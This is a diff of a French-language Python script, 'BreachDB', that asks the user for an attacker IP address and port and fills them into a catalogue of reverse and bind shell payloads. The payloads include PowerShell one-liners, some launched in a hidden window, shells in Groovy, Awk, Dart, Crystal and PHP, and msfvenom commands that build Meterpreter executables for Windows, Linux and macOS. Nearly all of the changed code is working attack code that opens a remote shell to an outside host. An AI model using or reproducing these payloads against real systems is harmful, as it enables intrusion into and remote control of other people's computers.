@@ -1,8 +1,16 @@
 import json
-#made by fenex
+import pyfiglet
 
 ip = '0.0.0.0'
 port = '4443'
+ascii_banner = pyfiglet.figlet_format("BreachDB", font="slant")
+print("\n"*10)
+print(ascii_banner)
+print("made by théorick")
+print("\n"*2)
+
+ip = input("Votre adresse ip : ")
+port = input("Votre port : ")
 
 os_cibles = ['linux', 'windows', 'mac','appleIOS', 'android']
 shells = {
@@ -233,12 +241,12 @@ failles_secu = [
     },
     {
         "name": "PowerShell #1",
-        "command": "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
+        "command": f"$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write(\"$Output`n\"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
         "meta": ["windows"]
     },
     {
         "name": "PowerShell #2",
-        "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+        "command": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
         "meta": ["windows"]
     },
     {
@@ -253,8 +261,8 @@ failles_secu = [
     },
     {
         "name": "PowerShell #5",
-        "command": f"""Start-Process $PSHOME\\powershell.exe -ArgumentList '{{
-            $client = New-Object Net.Sockets.TCPClient('{ip}', {port});
+        "command": f"""Start-Process $PSHOME\\powershell.exe -ArgumentList {{
+            $client = New-Object Net.Sockets.TCPClient({ip}, {port});
             $NetworkStream = $client.GetStream();
             $StreamWriter = New-Object IO.StreamWriter($NetworkStream);
             function WriteToStream ($String) {{
@@ -273,11 +281,25 @@ failles_secu = [
                 WriteToStream ($Output);
             }}
             $StreamWriter.Close();
-        }}' -WindowStyle Hidden""",
+        }} -WindowStyle Hidden""",
         "meta": ["windows"]
     },
     {
-        "name": "PowerShell #3 (Base64)",
+        "name": "PowerShell #3 client",
+        "command" : f"""Start-Process $PSHOME\\powershell.exe -ArgumentList {{
+            $client = New-Object System.Net.Sockets.TCPClient('{ip}', {port});
+            $stream = $client.GetStream();
+            [byte[]]$bytes = 0..65535 | % {{ 0 }};
+            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
+                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+                $sendback = (iex $data 2>&1 | Out-String);
+                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+                $stream.Write($sendbyte, 0, $sendbyte.Length);
+                $stream.Flush();
+            }};
+            $client.Close();
+        }} -WindowStyle Hidden""",
         "meta": ["windows"]
     },
     {
@@ -377,7 +399,7 @@ failles_secu = [
     },
     {
         "name": "Groovy",
-        "command": "String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
+        "command": f"String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();",
         "meta": ["windows"]
     },
     {
@@ -412,12 +434,12 @@ failles_secu = [
     },
     {
         "name": "Awk",
-        "command": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+        "command": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"{shell}>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }} }}' /dev/null",
         "meta": ["linux", "mac"]
     },
     {
         "name": "Dart",
-        "command": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
+        "command": f"import 'dart:io';\nimport 'dart:convert';\n\nmain() {{\n  Socket.connect(\"{ip}\", {port}).then((socket) {{\n    socket.listen((data) {{\n      Process.start('{shell}', []).then((Process process) {{\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) {{ socket.write(output); }});\n      }});\n    }},\n    onDone: () {{\n      socket.destroy();\n    }});\n  }});\n}}",
         "meta": ["linux", "mac", "windows"]
     },
     {
@@ -427,7 +449,7 @@ failles_secu = [
     },
     {
         "name": "Crystal (code)",
-        "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend",
+        "command": f"require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend",
         "meta": ["linux", "mac"]
     },
 
@@ -438,87 +460,87 @@ failles_secu = [
     },
     {
         "name": "PHP Bind",
-        "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'",
+        "command": f"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){{if(!socket_write($cl,\"$ \",2))exit;\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){{$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}} }}'",
         "meta": ["bind", "mac", "linux", "windows"]
     },
     {
         "name": "Windows Meterpreter Staged Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+        "command": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
         "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
     },
     {
         "name": "Windows Meterpreter Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+        "command": f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
         "meta": ["msfvenom", "windows", "stageless", "reverse"]
     },
     {
         "name": "Windows Staged Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+        "command": f"msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
         "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
     },
     {
         "name": "Windows Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+        "command": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
         "meta": ["msfvenom", "windows", "stageless", "reverse"]
     },
     {
         "name": "Windows Staged JSP Reverse TCP",
-        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",
+        "command": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",
         "meta": ["msfvenom", "windows", "staged", "reverse"]
     },
     {
         "name": "Windows Staged ASPX Reverse TCP",
-        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
+        "command": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
         "meta": ["msfvenom", "windows", "staged", "reverse"]
     },
     {
         "name": "Windows Staged ASPX Reverse TCP (x64)",
-        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
+        "command": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
         "meta": ["msfvenom", "windows", "staged", "reverse"]
     },
     {
         "name": "Linux Meterpreter Staged Reverse TCP (x64)",
-        "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
+        "command": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
         "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
     },
     {
         "name": "Linux Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
+        "command": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
         "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
     },
     {
         "name": "Windows Bind TCP ShellCode - BOF",
-        "command": "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf -o shellcode",
+        "command": f"msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf -o shellcode",
         "meta": ["msfvenom", "windows", "bind", "bufferoverflow"]
     },
     {
         "name": "macOS Meterpreter Staged Reverse TCP (x64)",
-        "command": "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
+        "command": f"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
         "meta": ["msfvenom", "mac", "stageless", "reverse"]
     },
     {
         "name": "macOS Meterpreter Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
+        "command": f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
         "meta": ["msfvenom", "mac", "stageless", "reverse"]
     },
     {
         "name": "macOS Stageless Reverse TCP (x64)",
-        "command": "msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
+        "command": f"msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
         "meta": ["msfvenom", "mac", "stageless", "reverse"]
     },
     {
         "name": "PHP Meterpreter Stageless Reverse TCP",
-        "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",
+        "command": f"msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",
         "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
     },
     {
         "name": "PHP Reverse PHP",
-        "command": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",
+        "command": f"msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",
         "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
     },
     {
         "name": "JSP Stageless Reverse TCP",
-        "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",
+        "command": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",
         "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
     },
     {
@@ -577,6 +599,7 @@ failles_secu = [
         "meta": ["windows"]
     },
 ]
+
 print("Faille disponible : \n")
 print("\n")
 for faille in failles_secu:
@@ -606,14 +629,3 @@ while True:
     command = get_command_by_name(search_name)
 
 print("shell", shell)
-
-
-
-
-
-
-
-
-
-
-
